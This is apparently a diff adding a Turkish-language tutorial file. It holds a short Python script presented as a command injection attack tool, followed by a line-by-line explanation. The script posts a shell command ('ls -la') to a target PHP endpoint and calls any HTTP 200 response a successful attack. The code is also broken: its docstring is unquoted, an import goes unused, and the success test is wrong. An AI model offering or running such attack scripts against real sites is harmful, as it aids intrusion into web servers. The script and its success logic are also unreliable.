@@ -1,0 +1,39 @@
+PYTHONLA COMMAND INJECTION SALDIRISI YAPMAK 
+import requests
+import re
+def command_injection(url, command):
+  Komut enjeksiyonu saldırısı için python kodu
+  Args:
+    url: Saldırının yapılacağı URL
+    command: Saldırının gerçekleştirileceği komut
+  Returns:
+    Sonuç
+  # URL'i ve komutu birleştirin
+  request_data = "command=" + command
+  # URL'e HTTP isteği gönderin
+  response = requests.post(url, data=request_data)
+  # Cevabı kontrol edin
+  if response.status_code == 200:
+    # Saldırı başarılı
+    return "Saldırı başarılı"
+  else:
+    # Saldırı başarısız
+    return "Saldırı başarısız"
+# Örnek kullanımı
+url = "http://example.com/command.php"
+command = "ls -la"
+# Saldırı yapın
+result = command_injection(url, command)
+# Sonucu yazdırın
+print(result)
+#Yazan Rıdvan Kaya
+Bu kod, bir web sitesine komut enjeksiyonu saldırısı yapmak için python dilinde yazılmış bir fonksiyon içeriyor. Komut enjeksiyonu, bir saldırganın, bir web uygulamasının güvenli olmayan şekilde komut satırı parametrelerini işlediği durumlarda, kendi komutlarını çalıştırmasına izin veren bir güvenlik açığıdır. Bu kodun yaptığı şeyler şunlardır:
+- requests ve re modüllerini içe aktarır. Bu modüller, HTTP istekleri göndermek ve metin işlemek için kullanılır .
+- command_injection adında bir fonksiyon tanımlar. Bu fonksiyon, iki parametre alır: url ve command. url, saldırının yapılacağı web sitesinin adresidir. command, saldırganın çalıştırmak istediği komuttur.
+- Fonksiyonun içinde, url ve command parametrelerini birleştirerek, bir HTTP isteği verisi oluşturur. Bu veri, command= şeklinde başlar ve saldırganın komutu ile devam eder. Örneğin, command=ls -la gibi.
+- Bu veriyi kullanarak, url'e bir HTTP POST isteği gönderir. Bu istek, web sitesinin komut satırına saldırganın komutunu geçirir.
+- Web sitesinin cevabını kontrol eder. Eğer cevap kodu 200 ise, saldırı başarılı olmuştur. Eğer değilse, saldırı başarısız olmuştur. Buna göre, bir sonuç döndürür.
+- Fonksiyonun altında, bir örnek kullanım gösterir. url değişkenine, saldırının yapılacağı web sitesinin adresini atar. command değişkenine, çalıştırmak istediği komutu atar. Bu örnekte, ls -la komutu, web sitesinin bulunduğu dizindeki dosya ve klasörleri listelemek için kullanılır.
+- Fonksiyonu, bu parametrelerle çağırır ve sonucu result değişkenine atar.
+- Sonucu ekrana yazdırır.
+Bu kod, Rıdvan Kaya tarafından yazılmıştır. 
